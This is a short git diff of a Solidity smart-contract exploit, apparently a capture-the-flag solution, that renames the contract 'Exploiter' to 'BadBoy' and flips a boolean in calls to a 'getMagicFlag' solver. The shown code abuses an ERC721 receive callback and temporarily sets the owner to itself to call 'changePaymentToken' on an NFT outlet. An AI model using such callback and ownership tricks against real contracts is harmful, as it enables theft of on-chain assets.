@@ -9,7 +9,7 @@ interface Solver {
     function getMagicFlag(uint, uint, bytes32, bool) external returns (bytes memory);
 }
 
-contract Exploiter {
+contract BadBoy {
     address owner;
     NFTOutlet nftOutlet;
     uint nftPrice;
@@ -39,7 +39,7 @@ contract Exploiter {
     function onERC721Received(address, address, uint256, bytes memory) external returns (bytes4) {
         if (!flag) {
             flag = true;
-            uint solution = uint(keccak256(Solver(solver).getMagicFlag(t1, t2, salt, false)));
+            uint solution = uint(keccak256(Solver(solver).getMagicFlag(t1, t2, salt, true)));
             puzzle.verify(t2 << 128 | t1, solution);
         }
         return this.onERC721Received.selector;
@@ -53,7 +53,7 @@ contract Exploiter {
             owner = address(this);
             nftOutlet.changePaymentToken(bsyc);
             owner = oldOwner;
-            return Solver(solver).getMagicFlag(t1, t2, salt, false);
+            return Solver(solver).getMagicFlag(t1, t2, salt, true);
         }
     }
 }
